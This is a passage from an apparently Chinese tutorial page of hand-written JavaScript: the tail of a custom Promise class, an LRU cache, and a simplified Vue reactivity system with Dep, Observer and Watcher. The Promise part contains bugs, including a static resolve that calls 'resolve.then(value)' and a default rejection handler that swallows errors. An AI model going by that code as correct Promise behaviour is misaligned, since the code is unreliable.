      <span>if</span> <span>(</span><span>this</span><span>.</span>status <span>===</span> MyPromise<span>.</span><span>PENDING</span><span>)</span> <span>{</span>
        <span>this</span><span>.</span>status <span>=</span> status
        <span>this</span><span>.</span>value <span>=</span> value
        <span>setTimeout</span><span>(</span><span>(</span><span>)</span> <span>=></span> <span>this</span><span>.</span>callbacks<span>.</span><span>forEach</span><span>(</span><span>cb</span> <span>=></span> cb<span>[</span>handlerProp<span>]</span><span>(</span>value<span>)</span><span>)</span><span>)</span>
      <span>}</span>
    <span>}</span>
    <span>try</span> <span>{</span>
      <span>executor</span><span>(</span>
        <span>createExeFn</span><span>(</span>MyPromise<span>.</span><span>FULFILLED</span><span>,</span> <span>'onFulfilled'</span><span>)</span><span>,</span>
        <span>createExeFn</span><span>(</span>MyPromise<span>.</span><span>REJECTED</span><span>,</span> <span>'onRejected'</span><span>)</span>
      <span>)</span>
    <span>}</span> <span>catch</span> <span>(</span>error<span>)</span> <span>{</span>
      <span>reject</span><span>(</span>error<span>)</span>
    <span>}</span>
  <span>}</span>
  <span>then</span><span>(</span><span>onFulfilled<span>,</span> onRejected</span><span>)</span> <span>{</span>
    <span>if</span> <span>(</span><span>typeof</span> onFulfilled <span>!==</span> <span>'function'</span><span>)</span> <span>onFulfilled</span> <span>=</span> <span>_</span> <span>=></span> <span>this</span><span>.</span>value
    <span>if</span> <span>(</span><span>typeof</span> onRejected <span>!==</span> <span>'function'</span><span>)</span> <span>onRejected</span> <span>=</span> <span>_</span> <span>=></span> <span>this</span><span>.</span>value

    <span>return</span> <span>new</span> <span>MyPromise</span><span>(</span><span>(</span><span>resolve<span>,</span> reject</span><span>)</span> <span>=></span> <span>{</span>
      <span>const</span> statusMap <span>=</span> <span>{</span>
        <span>[</span>MyPromise<span>.</span><span>PENDING</span><span>]</span><span>:</span> <span>_</span> <span>=></span> <span>{</span>
          <span>this</span><span>.</span>callbacks<span>.</span><span>push</span><span>(</span><span>{</span>
            <span>onFulfilled</span><span>:</span> <span>value</span> <span>=></span>
              <span>this</span><span>.</span><span>#shunt</span><span>(</span><span>onFulfilled</span><span>(</span>value<span>)</span><span>,</span> resolve<span>,</span> reject<span>)</span><span>,</span>
            <span>onRejected</span><span>:</span> <span>reason</span> <span>=></span>
              <span>this</span><span>.</span><span>#shunt</span><span>(</span><span>onRejected</span><span>(</span>reason<span>)</span><span>,</span> resolve<span>,</span> reject<span>)</span><span>,</span>
          <span>}</span><span>)</span>
        <span>}</span><span>,</span>
        <span>[</span>MyPromise<span>.</span><span>FULFILLED</span><span>]</span><span>:</span> <span>_</span> <span>=></span>
          <span>setTimeout</span><span>(</span><span>_</span> <span>=></span>
            <span>this</span><span>.</span><span>#shunt</span><span>(</span><span>onFulfilled</span><span>(</span><span>this</span><span>.</span>value<span>)</span><span>,</span> resolve<span>,</span> reject<span>)</span>
          <span>)</span><span>,</span>
        <span>[</span>MyPromise<span>.</span><span>REJECTED</span><span>]</span><span>:</span> <span>_</span> <span>=></span>
          <span>setTimeout</span><span>(</span><span>_</span> <span>=></span> <span>this</span><span>.</span><span>#shunt</span><span>(</span><span>onRejected</span><span>(</span><span>this</span><span>.</span>value<span>)</span><span>,</span> resolve<span>,</span> reject<span>)</span><span>)</span><span>,</span>
      <span>}</span>
      statusMap<span>[</span><span>this</span><span>.</span>status<span>]</span><span>(</span><span>)</span>
    <span>}</span><span>)</span>
  <span>}</span>
  <span>static</span> <span>resolve</span><span>(</span><span>value</span><span>)</span> <span>{</span>
    <span>return</span> <span>new</span> <span>MyPromise</span><span>(</span><span>(</span><span>resolve<span>,</span> reject</span><span>)</span> <span>=></span> <span>{</span>
      <span>if</span> <span>(</span>value <span>instanceof</span> <span>MyPromise</span><span>)</span> resolve<span>.</span><span>then</span><span>(</span>value<span>)</span>
      <span>else</span> <span>resolve</span><span>(</span>value<span>)</span>
    <span>}</span><span>)</span>
  <span>}</span>
  <span>static</span> <span>reject</span><span>(</span><span>reason</span><span>)</span> <span>{</span>
    <span>return</span> <span>new</span> <span>MyPromise</span><span>(</span><span>(</span><span>resolve<span>,</span> reject</span><span>)</span> <span>=></span> <span>reject</span><span>(</span>reason<span>)</span><span>)</span>
  <span>}</span>
  <span>static</span> <span>all</span><span>(</span><span>promises</span><span>)</span> <span>{</span>
    <span>return</span> <span>new</span> <span>MyPromise</span><span>(</span><span>(</span><span>resolve<span>,</span> reject</span><span>)</span> <span>=></span> <span>{</span>
      <span>const</span> results <span>=</span> <span>[</span><span>]</span>
      <span>let</span> count <span>=</span> <span>0</span>
      promises<span>.</span><span>forEach</span><span>(</span><span>(</span><span>promise<span>,</span> index</span><span>)</span> <span>=></span> <span>{</span>
        promise<span>.</span><span>then</span><span>(</span><span>result</span> <span>=></span> <span>{</span>
          results<span>[</span>index<span>]</span> <span>=</span> result
          count<span>++</span>
          count <span>>=</span> promises<span>.</span>length <span>&amp;&amp;</span> <span>resolve</span><span>(</span>results<span>)</span>
        <span>}</span><span>,</span> reject<span>)</span>
      <span>}</span><span>)</span>
    <span>}</span><span>)</span>
  <span>}</span>
  <span>static</span> <span>race</span><span>(</span><span>promises</span><span>)</span> <span>{</span>
    <span>return</span> <span>new</span> <span>MyPromise</span><span>(</span><span>(</span><span>resolve<span>,</span> reject</span><span>)</span> <span>=></span> <span>{</span>
      promises<span>.</span><span>forEach</span><span>(</span><span>promise</span> <span>=></span> promise<span>.</span><span>then</span><span>(</span>resolve<span>,</span> reject<span>)</span><span>)</span>
    <span>}</span><span>)</span>
  <span>}</span>
  <span>#shunt</span><span>(</span><span>result<span>,</span> resolve<span>,</span> reject</span><span>)</span> <span>{</span>
    <span>try</span> <span>{</span>
      <span>if</span> <span>(</span>result <span>instanceof</span> <span>MyPromise</span><span>)</span> result<span>.</span><span>then</span><span>(</span>resolve<span>,</span> reject<span>)</span>
      <span>else</span> <span>resolve</span><span>(</span>result<span>)</span>
    <span>}</span> <span>catch</span> <span>(</span>error<span>)</span> <span>{</span>
      <span>reject</span><span>(</span>error<span>)</span>
    <span>}</span>
  <span>}</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br><span>43</span><br><span>44</span><br><span>45</span><br><span>46</span><br><span>47</span><br><span>48</span><br><span>49</span><br><span>50</span><br><span>51</span><br><span>52</span><br><span>53</span><br><span>54</span><br><span>55</span><br><span>56</span><br><span>57</span><br><span>58</span><br><span>59</span><br><span>60</span><br><span>61</span><br><span>62</span><br><span>63</span><br><span>64</span><br><span>65</span><br><span>66</span><br><span>67</span><br><span>68</span><br><span>69</span><br><span>70</span><br><span>71</span><br><span>72</span><br><span>73</span><br><span>74</span><br><span>75</span><br><span>76</span><br><span>77</span><br><span>78</span><br><span>79</span><br><span>80</span><br><span>81</span><br><span>82</span><br><span>83</span><br><span>84</span><br><span>85</span><br><span>86</span><br></div></div><h2 id="_8-lru"> 8. LRU</h2>
<div><pre><code><span>class</span> <span>LRUCache</span> <span>{</span>
  <span>constructor</span><span>(</span><span>limit</span><span>)</span> <span>{</span>
    <span>this</span><span>.</span>limit <span>=</span> limit
    <span>this</span><span>.</span>cache <span>=</span> <span>new</span> <span>Map</span><span>(</span><span>)</span>
  <span>}</span>
  <span>get</span><span>(</span>key<span>)</span> <span>{</span>
    <span>if</span> <span>(</span><span>!</span><span>this</span><span>.</span>cache<span>.</span><span>has</span><span>(</span>key<span>)</span><span>)</span> <span>return</span> <span>undefined</span>
    <span>const</span> value <span>=</span> <span>this</span><span>.</span>cache<span>.</span><span>get</span><span>(</span>key<span>)</span>
    <span>this</span><span>.</span>cache<span>.</span><span>delete</span><span>(</span>key<span>)</span>
    <span>this</span><span>.</span>cache<span>.</span><span>set</span><span>(</span>key<span>,</span> value<span>)</span>
    <span>return</span> value
  <span>}</span>
  <span>put</span><span>(</span><span>key<span>,</span> value</span><span>)</span> <span>{</span>
    <span>if</span> <span>(</span><span>this</span><span>.</span>cache<span>.</span><span>has</span><span>(</span>key<span>)</span><span>)</span> <span>this</span><span>.</span>cache<span>.</span><span>delete</span><span>(</span>key<span>)</span>
    <span>else</span> <span>if</span> <span>(</span><span>this</span><span>.</span>cache<span>.</span>size <span>>=</span> <span>this</span><span>.</span>limit<span>)</span> <span>{</span>
      <span>this</span><span>.</span>cache<span>.</span><span>delete</span><span>(</span><span>this</span><span>.</span>cache<span>.</span><span>keys</span><span>(</span><span>)</span><span>.</span><span>next</span><span>(</span><span>)</span><span>.</span>value<span>)</span>
    <span>}</span>
    <span>this</span><span>.</span>cache<span>.</span><span>set</span><span>(</span>key<span>,</span> value<span>)</span>
  <span>}</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br></div></div><h2 id="_9-vue"> 9. Vue</h2>
<ul>
<li>index.html</li>
</ul>
<div><pre><code><span><span>&lt;!</span><span>DOCTYPE</span> <span>html</span><span>></span></span>
<span><span><span>&lt;</span>html</span> <span>lang</span><span><span>=</span><span>"</span>en<span>"</span></span><span>></span></span>
  <span><span><span>&lt;</span>head</span><span>></span></span>
    <span><span><span>&lt;</span>meta</span> <span>charset</span><span><span>=</span><span>"</span>UTF-8<span>"</span></span> <span>/></span></span>
    <span><span><span>&lt;</span>meta</span> <span>http-equiv</span><span><span>=</span><span>"</span>X-UA-Compatible<span>"</span></span> <span>content</span><span><span>=</span><span>"</span>IE=edge<span>"</span></span> <span>/></span></span>
    <span><span><span>&lt;</span>meta</span> <span>name</span><span><span>=</span><span>"</span>viewport<span>"</span></span> <span>content</span><span><span>=</span><span>"</span>width=device-width, initial-scale=1.0<span>"</span></span> <span>/></span></span>
    <span><span><span>&lt;</span>title</span><span>></span></span>Vue<span><span><span>&lt;/</span>title</span><span>></span></span>
  <span><span><span>&lt;/</span>head</span><span>></span></span>
  <span><span><span>&lt;</span>body</span><span>></span></span>
    <span><span><span>&lt;</span>center</span><span>></span></span>
      <span><span><span>&lt;</span>div</span> <span>id</span><span><span>=</span><span>"</span>app<span>"</span></span><span>></span></span><span><span><span>&lt;/</span>div</span><span>></span></span>
    <span><span><span>&lt;/</span>center</span><span>></span></span>

    <span><span><span>&lt;</span>script</span> <span>type</span><span><span>=</span><span>"</span>module<span>"</span></span><span>></span></span><span><span>
      <span>import</span> init <span>from</span> <span>'./init.js'</span>
      <span>const</span> vm <span>=</span> <span>{</span>
        <span>data</span><span>(</span><span>)</span> <span>{</span>
          <span>return</span> <span>{</span>
            <span>papa</span><span>:</span> <span>'Jack'</span><span>,</span>
          <span>}</span>
        <span>}</span><span>,</span>
        <span>computed</span><span>:</span> <span>{</span>
          <span>creation</span><span>(</span><span><span>{</span> papa <span>}</span></span><span>)</span> <span>{</span>
            console<span>.</span><span>log</span><span>(</span><span>'computed：'</span><span>,</span> papa<span>)</span>
            <span>return</span> papa <span>===</span> <span>'Jack'</span> <span>?</span> <span>'Alibaba'</span> <span>:</span> <span>'Tencent'</span>
          <span>}</span><span>,</span>
        <span>}</span><span>,</span>
        <span>watch</span><span>:</span> <span>{</span>
          <span>papa</span><span>(</span><span>value<span>,</span> oldValue</span><span>)</span> <span>{</span>
            console<span>.</span><span>log</span><span>(</span><span>'watch：'</span><span>,</span> value<span>,</span> oldValue<span>)</span>
          <span>}</span><span>,</span>
        <span>}</span><span>,</span>
      <span>}</span>

      <span>init</span><span>(</span>vm<span>)</span>

      app<span>.</span><span>onclick</span> <span>=</span> <span>(</span><span>)</span> <span>=></span> <span>{</span>
        vm<span>.</span>papa <span>=</span> vm<span>.</span>papa <span>===</span> <span>'Jack'</span> <span>?</span> <span>'Pony'</span> <span>:</span> <span>'Jack'</span>
      <span>}</span>
    </span></span><span><span><span>&lt;/</span>script</span><span>></span></span>
  <span><span><span>&lt;/</span>body</span><span>></span></span>
<span><span><span>&lt;/</span>html</span><span>></span></span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br></div></div><ul>
<li>init.js</li>
</ul>
<div><pre><code><span>import</span> <span>{</span> initState <span>}</span> <span>from</span> <span>'./state.js'</span>
<span>import</span> <span>{</span> mountComponent <span>}</span> <span>from</span> <span>'./lifecycle.js'</span>

<span>export</span> <span>default</span> <span>function</span> <span>init</span><span>(</span><span>vm</span><span>)</span> <span>{</span>
  <span>// 初始化状态</span>
  <span>initState</span><span>(</span>vm<span>)</span>
  <span>// 挂载组件</span>
  <span>mountComponent</span><span>(</span>vm<span>)</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br></div></div><ul>
<li>state.js</li>
</ul>
<div><pre><code><span>import</span> <span>{</span> observe <span>}</span> <span>from</span> <span>'./observe.js'</span>
<span>import</span> Dep <span>from</span> <span>'./dep.js'</span>
<span>import</span> Watcher <span>from</span> <span>'./watcher.js'</span>
<span>import</span> <span>{</span> noop <span>}</span> <span>from</span> <span>'./util.js'</span>

<span>const</span> sharedPropertyDefinition <span>=</span> <span>{</span>
  <span>enumerable</span><span>:</span> <span>true</span><span>,</span>
  <span>configurable</span><span>:</span> <span>true</span><span>,</span>
  <span>get</span><span>:</span> noop<span>,</span>
  <span>set</span><span>:</span> noop<span>,</span>
<span>}</span>

<span>// 代理（主要用来代理到实例上）</span>
<span>function</span> <span>proxy</span><span>(</span><span>target<span>,</span> sourceKey<span>,</span> key</span><span>)</span> <span>{</span>
  sharedPropertyDefinition<span>.</span><span>get</span> <span>=</span> <span>function</span> <span>proxyGetter</span><span>(</span><span>)</span> <span>{</span>
    <span>return</span> <span>this</span><span>[</span>sourceKey<span>]</span><span>[</span>key<span>]</span>
  <span>}</span>
  sharedPropertyDefinition<span>.</span><span>set</span> <span>=</span> <span>function</span> <span>proxySetter</span><span>(</span><span>val</span><span>)</span> <span>{</span>
    <span>this</span><span>[</span>sourceKey<span>]</span><span>[</span>key<span>]</span> <span>=</span> val
  <span>}</span>
  Object<span>.</span><span>defineProperty</span><span>(</span>target<span>,</span> key<span>,</span> sharedPropertyDefinition<span>)</span>
<span>}</span>

<span>// 初始化状态</span>
<span>export</span> <span>function</span> <span>initState</span><span>(</span><span>vm</span><span>)</span> <span>{</span>
  <span>if</span> <span>(</span>vm<span>.</span>data<span>)</span> <span>initData</span><span>(</span>vm<span>)</span>
  <span>if</span> <span>(</span>vm<span>.</span>computed<span>)</span> <span>initComputed</span><span>(</span>vm<span>,</span> vm<span>.</span>computed<span>)</span>
  <span>if</span> <span>(</span>vm<span>.</span>watch<span>)</span> <span>initWatch</span><span>(</span>vm<span>,</span> vm<span>.</span>watch<span>)</span>
<span>}</span>

<span>// 初始化 data</span>
<span>function</span> <span>initData</span><span>(</span><span>vm</span><span>)</span> <span>{</span>
  vm<span>.</span>_watchers <span>=</span> <span>[</span><span>]</span>
  <span>let</span> data <span>=</span> vm<span>.</span>data
  data <span>=</span> vm<span>.</span>_data <span>=</span> <span>typeof</span> data <span>===</span> <span>'function'</span> <span>?</span> vm<span>.</span><span>data</span><span>(</span><span>)</span> <span>:</span> data <span>||</span> <span>{</span><span>}</span>

  <span>// 将数据代理到实例上</span>
  <span>const</span> keys <span>=</span> Object<span>.</span><span>keys</span><span>(</span>data<span>)</span>
  <span>let</span> i <span>=</span> keys<span>.</span>length
  <span>while</span> <span>(</span>i<span>--</span><span>)</span> <span>{</span>
    <span>const</span> key <span>=</span> keys<span>[</span>i<span>]</span>
    <span>proxy</span><span>(</span>vm<span>,</span> <span><span>`</span><span>_data</span><span>`</span></span><span>,</span> key<span>)</span>
  <span>}</span>

  <span>observe</span><span>(</span>data<span>)</span>
<span>}</span>

<span>// 初始化 computed</span>
<span>function</span> <span>initComputed</span><span>(</span><span>vm<span>,</span> computed</span><span>)</span> <span>{</span>
  <span>const</span> watchers <span>=</span> <span>(</span>vm<span>.</span>_computedWatchers <span>=</span> Object<span>.</span><span>create</span><span>(</span><span>null</span><span>)</span><span>)</span>
  <span>for</span> <span>(</span><span>const</span> key <span>in</span> computed<span>)</span> <span>{</span>
    <span>const</span> getter <span>=</span> computed<span>[</span>key<span>]</span>
    watchers<span>[</span>key<span>]</span> <span>=</span> <span>new</span> <span>Watcher</span><span>(</span>vm<span>,</span> getter<span>,</span> noop<span>,</span> <span>{</span> <span>lazy</span><span>:</span> <span>true</span> <span>}</span><span>)</span>
    <span>// 将数据代理到实例上</span>
    <span>if</span> <span>(</span><span>!</span><span>(</span>key <span>in</span> vm<span>)</span><span>)</span> <span>{</span>
      <span>defineComputed</span><span>(</span>vm<span>,</span> key<span>)</span>
    <span>}</span>
  <span>}</span>
<span>}</span>

<span>// 定义响应式 computed</span>
<span>function</span> <span>defineComputed</span><span>(</span><span>target<span>,</span> key</span><span>)</span> <span>{</span>
  <span>// 简化下</span>
  Object<span>.</span><span>defineProperty</span><span>(</span>target<span>,</span> key<span>,</span> <span>{</span>
    <span>enumerable</span><span>:</span> <span>true</span><span>,</span>
    <span>configurable</span><span>:</span> <span>true</span><span>,</span>
    <span>get</span><span>(</span><span>)</span> <span>{</span>
      <span>const</span> watcher <span>=</span> <span>this</span><span>.</span>_computedWatchers <span>&amp;&amp;</span> <span>this</span><span>.</span>_computedWatchers<span>[</span>key<span>]</span>
      <span>if</span> <span>(</span>watcher<span>)</span> <span>{</span>
        <span>// dirty 为 true 才会重新计算</span>
        <span>if</span> <span>(</span>watcher<span>.</span>dirty<span>)</span> <span>{</span>
          watcher<span>.</span><span>evaluate</span><span>(</span><span>)</span>
        <span>}</span>
        <span>// 收集依赖</span>
        <span>if</span> <span>(</span>Dep<span>.</span>target<span>)</span> <span>{</span>
          watcher<span>.</span><span>depend</span><span>(</span><span>)</span>
        <span>}</span>
        <span>return</span> watcher<span>.</span>value
      <span>}</span>
    <span>}</span><span>,</span>
    <span>set</span><span>:</span> noop<span>,</span>
  <span>}</span><span>)</span>
<span>}</span>

<span>// 初始化 watch</span>
<span>function</span> <span>initWatch</span><span>(</span><span>vm<span>,</span> watch</span><span>)</span> <span>{</span>
  <span>for</span> <span>(</span><span>const</span> key <span>in</span> watch<span>)</span> <span>{</span>
    <span>const</span> handler <span>=</span> watch<span>[</span>key<span>]</span>
    <span>// 简化下 createWatcher 与 $watch</span>
    <span>new</span> <span>Watcher</span><span>(</span>vm<span>,</span> key<span>,</span> handler<span>,</span> <span>{</span> <span>user</span><span>:</span> <span>true</span> <span>}</span><span>)</span>
  <span>}</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br><span>43</span><br><span>44</span><br><span>45</span><br><span>46</span><br><span>47</span><br><span>48</span><br><span>49</span><br><span>50</span><br><span>51</span><br><span>52</span><br><span>53</span><br><span>54</span><br><span>55</span><br><span>56</span><br><span>57</span><br><span>58</span><br><span>59</span><br><span>60</span><br><span>61</span><br><span>62</span><br><span>63</span><br><span>64</span><br><span>65</span><br><span>66</span><br><span>67</span><br><span>68</span><br><span>69</span><br><span>70</span><br><span>71</span><br><span>72</span><br><span>73</span><br><span>74</span><br><span>75</span><br><span>76</span><br><span>77</span><br><span>78</span><br><span>79</span><br><span>80</span><br><span>81</span><br><span>82</span><br><span>83</span><br><span>84</span><br><span>85</span><br><span>86</span><br><span>87</span><br><span>88</span><br><span>89</span><br><span>90</span><br><span>91</span><br><span>92</span><br></div></div><ul>
<li>lifecycle.js</li>
</ul>
<div><pre><code><span>import</span> <span>{</span> noop <span>}</span> <span>from</span> <span>'./util.js'</span>
<span>import</span> Watcher <span>from</span> <span>'./watcher.js'</span>

<span>// 挂载组件</span>
<span>export</span> <span>function</span> <span>mountComponent</span><span>(</span><span>vm</span><span>)</span> <span>{</span>
  <span>// 更新组件（Vue 中使用 path 函数，其中有 vnode、diff、ast...，这里简化）</span>
  <span>function</span> <span>updateComponent</span><span>(</span><span>)</span> <span>{</span>
    app<span>.</span>innerHTML <span>=</span> <span><span>`</span><span><span>${</span>vm<span>.</span>papa<span>}</span></span><span> - </span><span><span>${</span>vm<span>.</span>creation<span>}</span></span><span> - </span><span><span>${</span>vm<span>.</span>creation<span>}</span></span><span>`</span></span>
  <span>}</span>

  <span>// RenderWatcher</span>
  <span>new</span> <span>Watcher</span><span>(</span>vm<span>,</span> updateComponent<span>,</span> noop<span>,</span> <span>{</span><span>}</span><span>,</span> <span>true</span><span>)</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br></div></div><ul>
<li>observe.js</li>
</ul>
<div><pre><code><span>import</span> Dep <span>from</span> <span>'./dep.js'</span>
<span>import</span> <span>{</span> isObject <span>}</span> <span>from</span> <span>'./util.js'</span>

<span>class</span> <span>Observer</span> <span>{</span>
  value
  dep
  <span>constructor</span><span>(</span><span>value</span><span>)</span> <span>{</span>
    <span>this</span><span>.</span>value <span>=</span> value
    <span>this</span><span>.</span>dep <span>=</span> <span>new</span> <span>Dep</span><span>(</span><span>)</span>
    Object<span>.</span><span>defineProperty</span><span>(</span>value<span>,</span> <span>'__ob__'</span><span>,</span> <span>{</span>
      <span>value</span><span>:</span> <span>this</span><span>,</span>
      <span>enumerable</span><span>:</span> <span>false</span><span>,</span>
      <span>writable</span><span>:</span> <span>true</span><span>,</span>
      <span>configurable</span><span>:</span> <span>true</span><span>,</span>
    <span>}</span><span>)</span>
    <span>this</span><span>.</span><span>walk</span><span>(</span>value<span>)</span>
  <span>}</span>
  <span>walk</span><span>(</span><span>obj</span><span>)</span> <span>{</span>
    <span>const</span> keys <span>=</span> Object<span>.</span><span>keys</span><span>(</span>obj<span>)</span>
    <span>for</span> <span>(</span><span>let</span> i <span>=</span> <span>0</span><span>;</span> i <span>&lt;</span> keys<span>.</span>length<span>;</span> i<span>++</span><span>)</span> <span>{</span>
      <span>defineReactive</span><span>(</span>obj<span>,</span> keys<span>[</span>i<span>]</span><span>)</span>
    <span>}</span>
  <span>}</span>
<span>}</span>

<span>export</span> <span>function</span> <span>observe</span><span>(</span><span>value</span><span>)</span> <span>{</span>
  <span>// 非对象不定义</span>
  <span>if</span> <span>(</span><span>!</span><span>isObject</span><span>(</span>value<span>)</span><span>)</span> <span>{</span>
    <span>return</span>
  <span>}</span>
  <span>new</span> <span>Observer</span><span>(</span>value<span>)</span>
<span>}</span>

<span>// 定义为响应式数据</span>
<span>export</span> <span>function</span> <span>defineReactive</span><span>(</span><span>obj<span>,</span> key<span>,</span> val</span><span>)</span> <span>{</span>
  <span>const</span> dep <span>=</span> <span>new</span> <span>Dep</span><span>(</span><span>)</span>
  val <span>=</span> obj<span>[</span>key<span>]</span>

  <span>let</span> childOb <span>=</span> <span>observe</span><span>(</span>val<span>)</span>
  Object<span>.</span><span>defineProperty</span><span>(</span>obj<span>,</span> key<span>,</span> <span>{</span>
    <span>enumerable</span><span>:</span> <span>true</span><span>,</span>
    <span>configurable</span><span>:</span> <span>true</span><span>,</span>
    <span>get</span><span>(</span><span>)</span> <span>{</span>
      <span>// 收集依赖</span>
      <span>if</span> <span>(</span>Dep<span>.</span>target<span>)</span> <span>{</span>
        dep<span>.</span><span>depend</span><span>(</span><span>)</span>
        <span>if</span> <span>(</span>childOb<span>)</span> <span>{</span>
          childOb<span>.</span>dep<span>.</span><span>depend</span><span>(</span><span>)</span>
        <span>}</span>
      <span>}</span>
      <span>return</span> val
    <span>}</span><span>,</span>
    <span>set</span><span>(</span>newVal<span>)</span> <span>{</span>
      <span>if</span> <span>(</span>newVal <span>===</span> val <span>||</span> <span>(</span>newVal <span>!==</span> newVal <span>&amp;&amp;</span> val <span>!==</span> val<span>)</span><span>)</span> <span>{</span>
        <span>return</span>
      <span>}</span>
      val <span>=</span> newVal
      <span>// 定义新值为响应式对象</span>
      childOb <span>=</span> <span>observe</span><span>(</span>newVal<span>)</span>
      <span>// 派发更新</span>
      dep<span>.</span><span>notify</span><span>(</span><span>)</span>
    <span>}</span><span>,</span>
  <span>}</span><span>)</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br><span>43</span><br><span>44</span><br><span>45</span><br><span>46</span><br><span>47</span><br><span>48</span><br><span>49</span><br><span>50</span><br><span>51</span><br><span>52</span><br><span>53</span><br><span>54</span><br><span>55</span><br><span>56</span><br><span>57</span><br><span>58</span><br><span>59</span><br><span>60</span><br><span>61</span><br><span>62</span><br><span>63</span><br><span>64</span><br></div></div><ul>
<li>dep.js</li>
</ul>
<div><pre><code><span>let</span> uid <span>=</span> <span>0</span>
<span>export</span> <span>default</span> <span>class</span> <span>Dep</span> <span>{</span>
  id
  subs
  <span>constructor</span><span>(</span><span>)</span> <span>{</span>
    <span>this</span><span>.</span>id <span>=</span> <span>++</span>uid
    <span>// Vue 在 watcher.addDep 中实现去重，这里简化下</span>
    <span>this</span><span>.</span>subs <span>=</span> <span>new</span> <span>Set</span><span>(</span><span>)</span>
  <span>}</span>
  <span>// 添加依赖</span>
  <span>addSub</span><span>(</span><span>sub</span><span>)</span> <span>{</span>
    <span>this</span><span>.</span>subs<span>.</span><span>add</span><span>(</span>sub<span>)</span>
  <span>}</span>
  <span>depend</span><span>(</span><span>)</span> <span>{</span>
    <span>if</span> <span>(</span>Dep<span>.</span>target<span>)</span> <span>{</span>
      Dep<span>.</span>target<span>.</span><span>addDep</span><span>(</span><span>this</span><span>)</span>
    <span>}</span>
  <span>}</span>
  <span>// 通知依赖更新</span>
  <span>notify</span><span>(</span><span>)</span> <span>{</span>
    <span>this</span><span>.</span>subs<span>.</span><span>forEach</span><span>(</span><span>sub</span> <span>=></span> sub<span>.</span><span>update</span><span>(</span><span>)</span><span>)</span>
  <span>}</span>
<span>}</span>

Dep<span>.</span>target <span>=</span> <span>null</span> <span>// 正在运行的 watcher</span>
<span>const</span> targetStack <span>=</span> <span>[</span><span>]</span> <span>// watcher 执行栈</span>

<span>// 压栈</span>
<span>export</span> <span>function</span> <span>pushTarget</span><span>(</span><span>target</span><span>)</span> <span>{</span>
  targetStack<span>.</span><span>push</span><span>(</span>target<span>)</span>
  Dep<span>.</span>target <span>=</span> target
<span>}</span>

<span>// 出栈</span>
<span>export</span> <span>function</span> <span>popTarget</span><span>(</span><span>)</span> <span>{</span>
  targetStack<span>.</span><span>pop</span><span>(</span><span>)</span>
  Dep<span>.</span>target <span>=</span> targetStack<span>[</span>targetStack<span>.</span>length <span>-</span> <span>1</span><span>]</span>
<span>}</span>
</code></pre>
